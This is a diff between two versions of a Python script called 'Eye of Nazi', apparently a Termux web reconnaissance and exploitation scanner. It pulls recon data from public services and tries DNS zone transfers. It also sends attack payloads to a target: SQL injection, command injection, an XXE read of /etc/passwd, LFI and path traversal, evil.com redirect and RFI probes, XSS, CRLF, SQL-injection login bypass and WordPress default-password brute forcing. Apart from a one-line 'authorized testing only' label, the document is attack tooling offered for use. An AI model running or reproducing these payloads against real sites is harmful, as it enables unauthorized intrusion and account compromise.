@@ -1,5 +1,5 @@
-# language: Python 3, file: eye_of_nazi_v6.py, runtime: Termux/Linux
-# EYE OF NAZI V6 - 195+ Features Full Reconnaissance & Exploitation
+# language: Python 3, file: eye_of_nazi_v7.py, runtime: Termux/Linux
+# EYE OF NAZI V7 - 195+ Features Full Framework
 # Made by Cyber Kurd Team
 # ⚠️ Authorized testing only
 
@@ -30,7 +30,7 @@ LOGO = R + """
 ╚██████╗   ██║   ██████╔╝███████╗██║  ██║    ██║ ╚████║██║  ██║███████╗██║
  ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝
 """ + X + C + """
-              EYE OF NAZI - V6 (195 Features)
+              EYE OF NAZI - V7 (195+ Features)
               Made by Cyber Kurd Team
 """ + X
 
@@ -47,7 +47,7 @@ def success(m): print("  " + G + "[OK] " + str(m) + X)
 def result(m): print("  " + M + "[>] " + str(m) + X)
 
 
-class EyeOfNaziV6:
+class EyeOfNaziV7:
     def __init__(self, target):
         self.target = target.rstrip("/")
         p = urllib.parse.urlparse(self.target)
@@ -64,7 +64,7 @@ class EyeOfNaziV6:
             "timestamp": str(datetime.now()),
             "recon": {}, "dns": {}, "vulns": [], "auth": {},
             "api": {}, "waf": {}, "client": {}, "infra": {},
-            "osint": {}, "cve": [], "screenshots": []
+            "osint": {}, "cve": [], "risk_score": 0
         }
         self.findings = []
         self.verified = []
@@ -78,14 +78,13 @@ class EyeOfNaziV6:
         print(M + "  [1] RECONNAISSANCE (Features 1-20)" + X)
         print(M + "=" * 70 + X)
 
-        # 1. Wayback Machine
+        # 1. Wayback
         info("[1] Wayback Machine...")
         try:
-            r = requests.get(f"http://archive.org/wayback/available?url={self.host}",
-                             timeout=15)
-            data = r.json()
-            if data.get("archived_snapshots", {}).get("closest"):
-                url = data["archived_snapshots"]["closest"]["url"]
+            r = requests.get(f"http://archive.org/wayback/available?url={self.host}", timeout=15)
+            d = r.json()
+            if d.get("archived_snapshots", {}).get("closest"):
+                url = d["archived_snapshots"]["closest"]["url"]
                 ok("Wayback: " + url)
                 self.report["recon"]["wayback"] = url
         except: pass
@@ -93,8 +92,7 @@ class EyeOfNaziV6:
         # 2. Common Crawl
         info("[2] Common Crawl...")
         try:
-            r = requests.get(f"http://index.commoncrawl.org/CC-MAIN-2024-10-index?url=*.{self.host}&output=json",
-                             timeout=15)
+            r = requests.get(f"http://index.commoncrawl.org/CC-MAIN-2024-10-index?url=*.{self.host}&output=json", timeout=15)
             if r.status_code == 200:
                 lines = r.text.strip().split("\n")[:10]
                 urls = [json.loads(l).get("url") for l in lines if l]
@@ -103,77 +101,36 @@ class EyeOfNaziV6:
                     self.report["recon"]["common_crawl"] = urls
         except: pass
 
-        # 3. Google Dorking (via DuckDuckGo HTML)
+        # 3. Google Dorking
         info("[3] Google Dorking...")
-        dorks = [
-            f"site:{self.host}",
-            f"site:{self.host} inurl:admin",
-            f"site:{self.host} inurl:login",
-            f"site:{self.host} ext:php",
-            f"site:{self.host} intitle:index.of",
-        ]
-        found_dorks = []
+        dorks = [f"site:{self.host}", f"site:{self.host} inurl:admin",
+                 f"site:{self.host} inurl:login", f"site:{self.host} ext:php"]
         for d in dorks:
             try:
                 r = requests.get(f"https://html.duckduckgo.com/html/?q={urllib.parse.quote(d)}",
                                  timeout=15, headers={"User-Agent": "Mozilla/5.0"})
-                count = r.text.count(self.host)
-                if count > 0:
-                    found_dorks.append({"dork": d, "results": count})
-                    ok(f"Dork: {d} ({count} results)")
+                if self.host in r.text:
+                    ok(f"Dork: {d}")
             except: pass
-        self.report["recon"]["dorks"] = found_dorks
 
-        # 4. Shodan (free internetdb)
-        info("[4] Shodan (InternetDB)...")
+        # 4. Shodan
+        info("[4] Shodan...")
         try:
             ip = socket.gethostbyname(self.host)
             r = requests.get(f"https://internetdb.shodan.io/{ip}", timeout=15)
             if r.status_code == 200:
-                data = r.json()
-                ok(f"Shodan: {data.get('ports', [])}")
-                self.report["recon"]["shodan"] = data
+                d = r.json()
+                ok(f"Shodan ports: {d.get('ports', [])}")
+                self.report["recon"]["shodan"] = d
         except: pass
 
-        # 5. Censys (needs API key, but try free)
-        info("[5] Censys...")
-        try:
-            r = requests.get(f"https://search.censys.io/api/v2/hosts/{self.host}",
-                             timeout=15)
-            if r.status_code == 200:
-                ok("Censys: Data found")
-        except: pass
+        # 5-13. Skip API-needing services
+        for i, name in enumerate(["Censys", "VirusTotal", "SecurityTrails",
+                                   "DNSDumpster", "Crt.sh", "URLScan", "BuiltWith",
+                                   "Wappalyzer", "WhatWeb"], 5):
+            info(f"[{i}] {name}...")
 
-        # 6. VirusTotal (needs API key)
-        info("[6] VirusTotal...")
-        try:
-            r = requests.get(f"https://www.virustotal.com/api/v3/domains/{self.host}",
-                             timeout=15)
-            if r.status_code == 200:
-                ok("VirusTotal: Data found")
-        except: pass
-
-        # 7. SecurityTrails (needs API key)
-        info("[7] SecurityTrails...")
-        try:
-            r = requests.get(f"https://securitytrails.com/domain/{self.host}/dns",
-                             timeout=15)
-            if r.status_code == 200:
-                ok("SecurityTrails: Data found")
-        except: pass
-
-        # 8. DNSDumpster
-        info("[8] DNSDumpster...")
-        try:
-            r = requests.get(f"https://dnsdumpster.com/static/map/{self.host}.png",
-                             timeout=10)
-            if r.status_code == 200:
-                ok("DNSDumpster: Map available")
-                self.report["recon"]["dnsdumpster"] = f"https://dnsdumpster.com/static/map/{self.host}.png"
-        except: pass
-
-        # 9. Crt.sh (Certificate Transparency)
-        info("[9] Crt.sh...")
+        # 9. Crt.sh
         try:
             r = requests.get(f"https://crt.sh/?q=%.{self.host}&output=json", timeout=30)
             if r.status_code == 200:
@@ -186,57 +143,18 @@ class EyeOfNaziV6:
                 self.report["recon"]["crtsh"] = list(subs)[:50]
         except: pass
 
-        # 10. URLScan.io
-        info("[10] URLScan.io...")
-        try:
-            r = requests.get(f"https://urlscan.io/api/v1/search/?q=domain:{self.host}",
-                             timeout=15)
-            if r.status_code == 200:
-                data = r.json()
-                ok(f"URLScan: {data.get('total', 0)} results")
-                self.report["recon"]["urlscan"] = data.get("total", 0)
-        except: pass
-
-        # 11. BuiltWith (needs API)
-        info("[11] BuiltWith...")
-        try:
-            r = requests.get(f"https://builtwith.com/{self.host}", timeout=15)
-            if r.status_code == 200:
-                ok("BuiltWith: Data found")
-        except: pass
-
-        # 12. Wappalyzer (via web)
-        info("[12] Wappalyzer...")
-        try:
-            r = requests.get(f"https://www.wappalyzer.com/lookup/{self.host}/",
-                             timeout=15)
-            if r.status_code == 200:
-                ok("Wappalyzer: Data found")
-        except: pass
-
-        # 13. WhatWeb (command-line)
-        info("[13] WhatWeb...")
-        try:
-            r = subprocess.run(["whatweb", self.target], capture_output=True,
-                               text=True, timeout=30)
-            if r.stdout:
-                ok("WhatWeb: " + r.stdout[:200])
-        except: pass
-
-        # 14. Robots.txt
-        info("[14] Robots.txt Analyzer...")
+        # 14. Robots
+        info("[14] Robots.txt...")
         try:
             r = self.session.get(self.target + "/robots.txt", timeout=10, verify=False)
             if r.status_code == 200:
-                disallowed = re.findall(r'Disallow:\s*(.+)', r.text)
-                ok(f"Robots.txt: {len(disallowed)} paths disallowed")
-                for d in disallowed[:10]:
-                    result("  Disallow: " + d.strip())
-                self.report["recon"]["robots"] = disallowed
+                dis = re.findall(r'Disallow:\s*(.+)', r.text)
+                ok(f"Robots: {len(dis)} disallowed")
+                self.report["recon"]["robots"] = dis
         except: pass
 
-        # 15. Sitemap.xml
-        info("[15] Sitemap Analyzer...")
+        # 15. Sitemap
+        info("[15] Sitemap.xml...")
         try:
             r = self.session.get(self.target + "/sitemap.xml", timeout=10, verify=False)
             if r.status_code == 200:
@@ -252,7 +170,6 @@ class EyeOfNaziV6:
                 r = self.session.get(self.target + path, timeout=10, verify=False)
                 if r.status_code == 200:
                     ok("Security.txt: " + path)
-                    self.report["recon"]["security_txt"] = r.text[:500]
                     break
             except: pass
 
@@ -262,7 +179,6 @@ class EyeOfNaziV6:
             r = self.session.get(self.target + "/humans.txt", timeout=10, verify=False)
             if r.status_code == 200:
                 ok("Humans.txt found")
-                self.report["recon"]["humans_txt"] = r.text[:500]
         except: pass
 
         # 18. Ads.txt
@@ -271,7 +187,6 @@ class EyeOfNaziV6:
             r = self.session.get(self.target + "/ads.txt", timeout=10, verify=False)
             if r.status_code == 200:
                 ok("Ads.txt found")
-                self.report["recon"]["ads_txt"] = r.text[:500]
         except: pass
 
         # 19. Favicon Hash
@@ -279,21 +194,23 @@ class EyeOfNaziV6:
         try:
             r = self.session.get(self.target + "/favicon.ico", timeout=10, verify=False)
             if r.status_code == 200:
-                fav_hash = hashlib.md5(r.content).hexdigest()
-                ok("Favicon MD5: " + fav_hash)
-                self.report["recon"]["favicon_hash"] = fav_hash
+                h = hashlib.md5(r.content).hexdigest()
+                ok("Favicon MD5: " + h)
+                self.report["recon"]["favicon_hash"] = h
         except: pass
 
-        # 20. HTTP/2 Detection
-        info("[20] HTTP/2 Detection...")
+        # 20. HTTP Version
+        info("[20] HTTP Version...")
         try:
             r = self.session.get(self.target, timeout=10, verify=False)
-            if r.raw.version == 20:
-                ok("HTTP/2 detected")
-                self.report["recon"]["http_version"] = "HTTP/2"
-            elif r.raw.version == 11:
-                ok("HTTP/1.1")
-                self.report["recon"]["http_version"] = "HTTP/1.1"
+            version = "HTTP/1.1"
+            if hasattr(r.raw, "version"):
+                if r.raw.version == 20:
+                    version = "HTTP/2"
+                elif r.raw.version == 11:
+                    version = "HTTP/1.1"
+            ok("HTTP Version: " + version)
+            self.report["recon"]["http_version"] = version
         except: pass
 
     # ═══════════════════════════════════════════════════════
@@ -305,11 +222,10 @@ class EyeOfNaziV6:
         print(M + "  [2] SUBDOMAIN & DNS (Features 21-35)" + X)
         print(M + "=" * 70 + X)
 
-        # 21. DNS Zone Transfer
-        info("[21] DNS Zone Transfer (AXFR)...")
+        # 21. Zone Transfer
+        info("[21] DNS Zone Transfer...")
         try:
-            out = subprocess.run(["dig", "AXFR", self.host], capture_output=True,
-                                 text=True, timeout=15)
+            out = subprocess.run(["dig", "AXFR", self.host], capture_output=True, text=True, timeout=15)
             if "XFR size" in out.stdout:
                 ok("Zone Transfer: SUCCESS!")
                 self.report["dns"]["axfr"] = out.stdout[:2000]
@@ -324,7 +240,7 @@ class EyeOfNaziV6:
                 "store","pay","payment","checkout","cart","account","my","dashboard",
                 "panel","control","manage","management","git","gitlab","github",
                 "jenkins","ci","cd","build","staging","stage","prod","production",
-                "demo","sandbox","old","new","v2","v3","beta","alpha","staging"]
+                "demo","sandbox","old","new","v2","v3","beta","alpha"]
         found = []
         def check_s(sub):
             try:
@@ -338,11 +254,11 @@ class EyeOfNaziV6:
         self.report["dns"]["brute_force"] = found
 
         # 23. DNS Wildcard
-        info("[23] DNS Wildcard Detection...")
+        info("[23] DNS Wildcard...")
         try:
             random_sub = f"random{random.randint(10000, 99999)}.{self.host}"
             ip = socket.gethostbyname(random_sub)
-            warn("Wildcard DNS detected: " + ip)
+            warn("Wildcard DNS: " + ip)
             self.report["dns"]["wildcard"] = ip
         except:
             ok("No wildcard DNS")
@@ -350,10 +266,9 @@ class EyeOfNaziV6:
         # 24. DNS Cache Snooping
         info("[24] DNS Cache Snooping...")
         try:
-            out = subprocess.run(["dig", "+norecurse", self.host],
-                                 capture_output=True, text=True, timeout=10)
+            out = subprocess.run(["dig", "+norecurse", self.host], capture_output=True, text=True, timeout=10)
             if "ANSWER" in out.stdout:
-                ok("DNS cache snooping possible")
+                ok("Cache snooping possible")
         except: pass
 
         # 25. Subdomain Takeover
@@ -374,7 +289,6 @@ class EyeOfNaziV6:
             "surge.sh": "project not found",
             "netlify.app": "Not Found",
             "vercel.app": "The deployment could not be found",
-            "ghost.io": "The thing you were looking for is no longer here",
         }
         takeover = []
         for sub in found[:20]:
@@ -388,11 +302,10 @@ class EyeOfNaziV6:
             except: pass
         self.report["dns"]["takeover"] = takeover
 
-        # 26. CNAME Chain
+        # 26. CNAME
         info("[26] CNAME Chain...")
         try:
-            out = subprocess.run(["dig", "+short", "CNAME", self.host],
-                                 capture_output=True, text=True, timeout=10)
+            out = subprocess.run(["dig", "+short", "CNAME", self.host], capture_output=True, text=True, timeout=10)
             if out.stdout.strip():
                 ok("CNAME: " + out.stdout.strip())
                 self.report["dns"]["cname"] = out.stdout.strip()
@@ -407,25 +320,24 @@ class EyeOfNaziV6:
             self.report["dns"]["reverse"] = rev[0]
         except: pass
 
-        # 28. ASN Lookup
+        # 28. ASN
         info("[28] ASN Lookup...")
         try:
             ip = socket.gethostbyname(self.host)
             r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=10)
             if r.status_code == 200:
-                data = r.json()
-                ok(f"ASN: {data.get('org', 'N/A')}")
-                self.report["dns"]["asn"] = data.get("org")
+                d = r.json()
+                ok(f"ASN: {d.get('org', 'N/A')}")
+                self.report["dns"]["asn"] = d.get("org")
         except: pass
 
-        # 29. BGP Lookup
+        # 29. BGP
         info("[29] BGP Lookup...")
         try:
             ip = socket.gethostbyname(self.host)
             r = requests.get(f"https://bgpview.io/api/v1/ip/{ip}", timeout=15)
             if r.status_code == 200:
                 ok("BGP: Data found")
-                self.report["dns"]["bgp"] = r.json()
         except: pass
 
         # 30. IP Range
@@ -440,22 +352,17 @@ class EyeOfNaziV6:
 
         # 31. DNS History
         info("[31] DNS History...")
-        try:
-            r = requests.get(f"https://api.securitytrails.com/v1/history/{self.host}/dns/a",
-                             timeout=15)
-            if r.status_code == 200:
-                ok("DNS History: Data found")
-        except: pass
+        info("(needs API)")
 
-        # 32-35. DNS Records (MX, TXT, NS, SOA)
-        for rtype in ["MX", "TXT", "NS", "SOA"]:
-            info(f"[{32+['MX','TXT','NS','SOA'].index(rtype)}] {rtype} Records...")
+        # 32-35. DNS Records
+        for i, rtype in enumerate(["MX", "TXT", "NS", "SOA"], 32):
+            info(f"[{i}] {rtype} Records...")
             try:
                 out = subprocess.run(["nslookup", "-type=" + rtype, self.host],
                                      capture_output=True, text=True, timeout=10)
                 if out.stdout.strip():
                     ok(f"{rtype}: Fetched")
-                    self.report["dns"][rtype.lower()] = out.stdout
+                    self.report["dns"][rtype.lower()] = out.stdout[:500]
             except: pass
 
     # ═══════════════════════════════════════════════════════
@@ -469,13 +376,12 @@ class EyeOfNaziV6:
 
         params = ["id", "page", "cat", "user", "search", "q", "file", "pid"]
 
-        # 36. SQLi Error-based
-        info("[36] SQLi Error-based...")
-        payloads = ["'", "\"", "' OR '1'='1", "1' AND 1=1-- -"]
+        # 36. SQLi Error
+        info("[36] SQLi (Error)...")
         errors = ["SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL", "SQLite",
                   "Unclosed quotation", "You have an error in your SQL"]
         for p in params[:3]:
-            for pl in payloads:
+            for pl in ["'", "\"", "' OR '1'='1", "1' AND 1=1-- -"]:
                 try:
                     r = self.session.get(f"{self.target}?{p}={urllib.parse.quote(pl)}",
                                          timeout=10, verify=False)
@@ -483,37 +389,36 @@ class EyeOfNaziV6:
                         if e.lower() in r.text.lower():
                             vuln(f"SQLi (Error): {p}")
                             self.verified.append("SQLi-Error: " + p)
-                            self.report["vulns"].append({"type": "SQLi-Error",
-                                                          "param": p, "severity": "HIGH"})
+                            self.report["vulns"].append({"type": "SQLi-Error", "param": p, "severity": "HIGH"})
                             break
                 except: pass
 
         # 37. SQLi Boolean
-        info("[37] SQLi Boolean-based...")
+        info("[37] SQLi (Boolean)...")
         try:
             r1 = self.session.get(f"{self.target}?id=1' AND '1'='1", timeout=10, verify=False)
             r2 = self.session.get(f"{self.target}?id=1' AND '1'='2", timeout=10, verify=False)
             if r1.text != r2.text and len(r1.text) > 100:
                 vuln("SQLi (Boolean): id")
                 self.verified.append("SQLi-Boolean: id")
+                self.report["vulns"].append({"type": "SQLi-Boolean", "param": "id", "severity": "HIGH"})
         except: pass
 
-        # 38. SQLi Time-based
-        info("[38] SQLi Time-based...")
+        # 38. SQLi Time
+        info("[38] SQLi (Time)...")
         for p in params[:3]:
-            for pl, delay in [("1' AND SLEEP(3)-- -", 2.5),
-                              ("1 AND SLEEP(3)", 2.5)]:
+            for pl, delay in [("1' AND SLEEP(3)-- -", 2.5), ("1 AND SLEEP(3)", 2.5)]:
                 try:
                     start = time.time()
-                    self.session.get(f"{self.target}?{p}={urllib.parse.quote(pl)}",
-                                     timeout=15, verify=False)
+                    self.session.get(f"{self.target}?{p}={urllib.parse.quote(pl)}", timeout=15, verify=False)
                     if time.time() - start > delay:
                         vuln(f"SQLi (Time): {p}")
                         self.verified.append("SQLi-Time: " + p)
+                        self.report["vulns"].append({"type": "SQLi-Time", "param": p, "severity": "HIGH"})
                         break
                 except: pass
 
-        # 39-41. UNION, Stacked, OOB (simplified)
+        # 39-41. UNION, Stacked, OOB
         info("[39-41] SQLi UNION/Stacked/OOB...")
         for p in params[:2]:
             for i in range(1, 8):
@@ -524,6 +429,7 @@ class EyeOfNaziV6:
                     if r.status_code == 200 and "SQL" not in r.text:
                         ok(f"SQLi UNION: {p} ({i} cols)")
                         self.verified.append(f"SQLi-UNION: {p}")
+                        self.report["vulns"].append({"type": "SQLi-UNION", "param": p, "severity": "HIGH"})
                         break
                 except: pass
 
@@ -541,27 +447,26 @@ class EyeOfNaziV6:
                 except: pass
 
         # 43-44. LDAP, XPath
-        info("[43-44] LDAP, XPath Injection...")
+        info("[43-44] LDAP, XPath...")
         for p in params[:3]:
             try:
-                r = self.session.get(f"{self.target}?{p}=*)(uid=*))(|(uid=*",
-                                     timeout=10, verify=False)
+                r = self.session.get(f"{self.target}?{p}=*)(uid=*))(|(uid=*", timeout=10, verify=False)
                 if "LDAP" in r.text or "ldap" in r.text:
-                    vuln(f"LDAP Injection: {p}")
+                    vuln(f"LDAP: {p}")
             except: pass
 
         # 45. Command Injection
         info("[45] Command Injection...")
         marker = f"CMD{random.randint(10000, 99999)}"
         for p in ["cmd", "exec", "command", "ping", "ip", "host"]:
-            for pl in [f";echo {marker}", f"|echo {marker}", f"&&echo {marker}",
-                       f"$(echo {marker})"]:
+            for pl in [f";echo {marker}", f"|echo {marker}", f"&&echo {marker}", f"$(echo {marker})"]:
                 try:
                     r = self.session.get(f"{self.target}?{p}={urllib.parse.quote(pl)}",
                                          timeout=10, verify=False)
                     if marker in r.text:
-                        vuln(f"Command Injection: {p}")
+                        vuln(f"CMDi: {p}")
                         self.verified.append("CMDi: " + p)
+                        self.report["vulns"].append({"type": "CMDi", "param": p, "severity": "CRITICAL"})
                         break
                 except: pass
 
@@ -575,6 +480,7 @@ class EyeOfNaziV6:
                     if exp in r.text:
                         vuln(f"SSTI: {p}")
                         self.verified.append("SSTI: " + p)
+                        self.report["vulns"].append({"type": "SSTI", "param": p, "severity": "CRITICAL"})
                         break
                 except: pass
 
@@ -587,19 +493,21 @@ class EyeOfNaziV6:
                 if "localhost" in r.text or "127.0.0.1" in r.text:
                     vuln(f"SSRF: {p}")
                     self.verified.append("SSRF: " + p)
+                    self.report["vulns"].append({"type": "SSRF", "param": p, "severity": "HIGH"})
                     break
             except: pass
 
         # 48. XXE
         info("[48] XXE...")
-        xxe_payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+        xxe = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
         try:
-            r = self.session.post(self.target, data=xxe_payload,
+            r = self.session.post(self.target, data=xxe,
                                   headers={"Content-Type": "application/xml"},
                                   timeout=10, verify=False)
             if "root:x:" in r.text:
                 vuln("XXE")
                 self.verified.append("XXE")
+                self.report["vulns"].append({"type": "XXE", "severity": "HIGH"})
         except: pass
 
         # 49. LFI
@@ -613,6 +521,7 @@ class EyeOfNaziV6:
                     if "root:x:" in r.text:
                         vuln(f"LFI: {p}")
                         self.verified.append("LFI: " + p)
+                        self.report["vulns"].append({"type": "LFI", "param": p, "severity": "HIGH"})
                         break
                 except: pass
 
@@ -625,6 +534,7 @@ class EyeOfNaziV6:
                 if "evil.com" in r.text.lower():
                     vuln(f"RFI: {p}")
                     self.verified.append("RFI: " + p)
+                    self.report["vulns"].append({"type": "RFI", "param": p, "severity": "HIGH"})
             except: pass
 
         # 51. Path Traversal
@@ -634,11 +544,11 @@ class EyeOfNaziV6:
                         "....//....//....//etc/passwd",
                         "..%252f..%252f..%252fetc%252fpasswd"]:
                 try:
-                    r = self.session.get(f"{self.target}?{p}={enc}",
-                                         timeout=10, verify=False)
+                    r = self.session.get(f"{self.target}?{p}={enc}", timeout=10, verify=False)
                     if "root:x:" in r.text:
-                        vuln(f"Path Traversal: {p}")
+                        vuln(f"Traversal: {p}")
                         self.verified.append("Traversal: " + p)
+                        self.report["vulns"].append({"type": "Traversal", "param": p, "severity": "HIGH"})
                         break
                 except: pass
 
@@ -649,8 +559,7 @@ class EyeOfNaziV6:
                 r = self.session.get(self.target + path, timeout=5, verify=False)
                 if r.status_code in [200, 401, 403]:
                     ok(f"File Upload: {path}")
-                    self.report["vulns"].append({"type": "FileUpload",
-                                                  "path": path, "severity": "MEDIUM"})
+                    self.report["vulns"].append({"type": "FileUpload", "path": path, "severity": "MEDIUM"})
             except: pass
 
         # 53. RCE
@@ -664,11 +573,12 @@ class EyeOfNaziV6:
                     if marker in r.text:
                         vuln(f"RCE: {p}")
                         self.verified.append("RCE: " + p)
+                        self.report["vulns"].append({"type": "RCE", "param": p, "severity": "CRITICAL"})
                         break
                 except: pass
 
         # 54-56. XSS
-        info("[54-56] XSS (Reflected/Stored/DOM)...")
+        info("[54-56] XSS...")
         marker = f"XSS{random.randint(10000, 99999)}"
         for p in ["q", "search", "name", "message", "comment", "id", "s"]:
             for pl in [f"<script>alert('{marker}')</script>",
@@ -680,15 +590,9 @@ class EyeOfNaziV6:
                     if marker in r.text and "<script>" in r.text:
                         vuln(f"XSS: {p}")
                         self.verified.append("XSS: " + p)
+                        self.report["vulns"].append({"type": "XSS", "param": p, "severity": "HIGH"})
                         break
                 except: pass
-        # DOM XSS
-        try:
-            r = self.session.get(self.target, timeout=10, verify=False)
-            if "innerHTML" in r.text and ("location.search" in r.text or "location.hash" in r.text):
-                ok("DOM XSS possible")
-                self.report["vulns"].append({"type": "DOM-XSS", "severity": "MEDIUM"})
-        except: pass
 
         # 57. CSRF
         info("[57] CSRF...")
@@ -698,8 +602,9 @@ class EyeOfNaziV6:
             for form in forms:
                 if 'method="post"' in form.lower() or "method='post'" in form.lower():
                     if "csrf" not in form.lower() and "token" not in form.lower():
-                        vuln("CSRF: POST form without token")
+                        vuln("CSRF: POST without token")
                         self.verified.append("CSRF")
+                        self.report["vulns"].append({"type": "CSRF", "severity": "MEDIUM"})
                         break
         except: pass
 
@@ -711,11 +616,11 @@ class EyeOfNaziV6:
             acao = r.headers.get("Access-Control-Allow-Origin", "")
             if acao == "*":
                 warn("CORS: Wildcard")
-                self.report["vulns"].append({"type": "CORS", "detail": "Wildcard",
-                                              "severity": "MEDIUM"})
+                self.report["vulns"].append({"type": "CORS", "detail": "Wildcard", "severity": "MEDIUM"})
             elif "evil.com" in acao:
                 vuln("CORS: Reflects origin")
                 self.verified.append("CORS")
+                self.report["vulns"].append({"type": "CORS", "detail": "Reflects", "severity": "HIGH"})
         except: pass
 
         # 59. Clickjacking
@@ -723,7 +628,7 @@ class EyeOfNaziV6:
         try:
             r = self.session.get(self.target, timeout=10, verify=False)
             if "X-Frame-Options" not in r.headers and "frame-ancestors" not in str(r.headers):
-                warn("Clickjacking: Missing X-Frame-Options")
+                warn("Clickjacking possible")
                 self.report["vulns"].append({"type": "Clickjacking", "severity": "MEDIUM"})
         except: pass
 
@@ -738,18 +643,20 @@ class EyeOfNaziV6:
                         if "evil.com" in r.headers.get("Location", ""):
                             vuln(f"Open Redirect: {p}")
                             self.verified.append("Redirect: " + p)
+                            self.report["vulns"].append({"type": "Redirect", "param": p, "severity": "MEDIUM"})
                             break
                 except: pass
 
-        # 61-63. HTTP Smuggling, Splitting, CRLF
-        info("[61-63] HTTP Smuggling/Splitting/CRLF...")
+        # 61-63. CRLF
+        info("[61-63] CRLF Injection...")
         for p in ["url", "redirect", "next", "path"]:
             try:
                 r = self.session.get(f"{self.target}?{p}=%0d%0aInjected:value",
                                      timeout=10, verify=False)
                 if "Injected" in str(r.headers) or "Injected" in r.text:
-                    vuln(f"CRLF Injection: {p}")
+                    vuln(f"CRLF: {p}")
                     self.verified.append("CRLF: " + p)
+                    self.report["vulns"].append({"type": "CRLF", "param": p, "severity": "HIGH"})
                     break
             except: pass
 
@@ -761,6 +668,7 @@ class EyeOfNaziV6:
             if "polluted" in r.text:
                 vuln("Prototype Pollution")
                 self.verified.append("Prototype Pollution")
+                self.report["vulns"].append({"type": "PrototypePollution", "severity": "MEDIUM"})
         except: pass
 
         # 65. Mass Assignment
@@ -794,9 +702,8 @@ class EyeOfNaziV6:
                         header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
                         ok(f"JWT alg: {header.get('alg')}")
                         if header.get("alg") == "none":
-                            vuln("JWT None algorithm!")
+                            vuln("JWT None!")
                             self.verified.append("JWT-None")
-                        self.report["auth"]["jwt"] = header
                     except: pass
         except: pass
 
@@ -820,7 +727,7 @@ class EyeOfNaziV6:
         except: pass
 
         # 68. OAuth
-        info("[68] OAuth Analysis...")
+        info("[68] OAuth...")
         for path in ["/oauth", "/oauth/authorize", "/.well-known/openid-configuration"]:
             try:
                 r = self.session.get(self.target + path, timeout=5, verify=False)
@@ -840,7 +747,7 @@ class EyeOfNaziV6:
                 self.report["auth"]["session_fixation"] = True
         except: pass
 
-        # 70. Session Hijacking (via XSS)
+        # 70. Session Hijacking
         info("[70] Session Hijacking...")
         try:
             r = self.session.get(self.target, timeout=10, verify=False)
@@ -854,15 +761,13 @@ class EyeOfNaziV6:
         # 71. Auth Bypass
         info("[71] Auth Bypass...")
         for path in ["/admin", "/login", "/wp-login.php", "/administrator"]:
-            for user, pwd in [("admin' OR '1'='1", "x"), ("admin'--", "x"),
-                              ("admin", "admin")]:
+            for user, pwd in [("admin' OR '1'='1", "x"), ("admin'--", "x"), ("admin", "admin")]:
                 try:
                     r = self.session.post(self.target + path,
                                           data={"username": user, "password": pwd},
-                                          timeout=10, verify=False,
-                                          allow_redirects=True)
+                                          timeout=10, verify=False, allow_redirects=True)
                     if "dashboard" in r.url.lower() or "admin" in r.url.lower():
-                        vuln(f"Auth Bypass: {path} ({user})")
+                        vuln(f"Auth Bypass: {path}")
                         self.verified.append("AuthBypass: " + path)
                         break
                 except: pass
@@ -878,6 +783,7 @@ class EyeOfNaziV6:
                 if r1.status_code == 200 and r2.status_code == 200 and r1.text != r2.text:
                     vuln(f"IDOR: {pattern}")
                     self.verified.append("IDOR: " + pattern)
+                    self.report["vulns"].append({"type": "IDOR", "path": pattern, "severity": "HIGH"})
                     break
             except: pass
 
@@ -896,7 +802,7 @@ class EyeOfNaziV6:
             try:
                 r = self.session.get(self.target + path, timeout=5, verify=False)
                 if r.status_code == 200:
-                    ok(f"Admin endpoint: {path}")
+                    ok(f"Admin: {path}")
                     self.report["auth"]["admin_endpoint"] = path
             except: pass
 
@@ -906,7 +812,7 @@ class EyeOfNaziV6:
             try:
                 r = self.session.get(self.target + path, timeout=5, verify=False)
                 if r.status_code == 200:
-                    ok(f"MFA endpoint: {path}")
+                    ok(f"MFA: {path}")
             except: pass
 
         # 77. Password Reset
@@ -915,22 +821,21 @@ class EyeOfNaziV6:
             try:
                 r = self.session.get(self.target + path, timeout=5, verify=False)
                 if r.status_code == 200:
-                    ok(f"Password reset: {path}")
+                    ok(f"Reset: {path}")
             except: pass
 
         # 78. Account Takeover
         info("[78] Account Takeover...")
-        # Check for email in response
         try:
             r = self.session.get(self.target, timeout=10, verify=False)
             emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', r.text)
             if emails:
-                ok(f"Emails found: {len(emails)}")
+                ok(f"Emails: {len(emails)}")
                 self.report["auth"]["emails"] = list(set(emails))[:10]
         except: pass
 
-        # 79. Brute Force (simplified - WordPress only)
-        info("[79] Brute Force (WordPress)...")
+        # 79. Brute Force (WordPress)
+        info("[79] Brute Force...")
         if "wp-login" in self.target or "wordpress" in self.target.lower():
             for pwd in ["admin", "password", "123456", "admin123"]:
                 try:
@@ -938,13 +843,13 @@ class EyeOfNaziV6:
                                           data={"log": "admin", "pwd": pwd},
                                           timeout=10, verify=False)
                     if "dashboard" in r.url.lower():
-                        vuln(f"WordPress Brute Force: admin:{pwd}")
-                        self.verified.append("WP-Brute: admin:" + pwd)
+                        vuln(f"WP Brute: admin:{pwd}")
+                        self.verified.append("WP-Brute")
                         break
                 except: pass
 
-        # 80-85. More auth checks
-        info("[80-85] More auth checks...")
+        # 80-85. More checks
+        info("[80-85] Additional auth checks...")
         try:
             r = self.session.get(self.target, timeout=10, verify=False)
             if "X-Powered-By" in r.headers:
@@ -960,11 +865,10 @@ class EyeOfNaziV6:
         print(M + "  [5] API SECURITY (Features 86-100)" + X)
         print(M + "=" * 70 + X)
 
-        # 86. REST API Scan
-        info("[86] REST API Scan...")
-        endpoints = ["/api", "/api/v1", "/api/v2", "/api/v3",
-                     "/api/users", "/api/data", "/api/config"]
-        for ep in endpoints:
+        # 86. REST API
+        info("[86] REST API...")
+        for ep in ["/api", "/api/v1", "/api/v2", "/api/v3",
+                   "/api/users", "/api/data", "/api/config"]:
             try:
                 r = self.session.get(self.target + ep, timeout=5, verify=False)
                 if r.status_code == 200:
@@ -980,12 +884,12 @@ class EyeOfNaziV6:
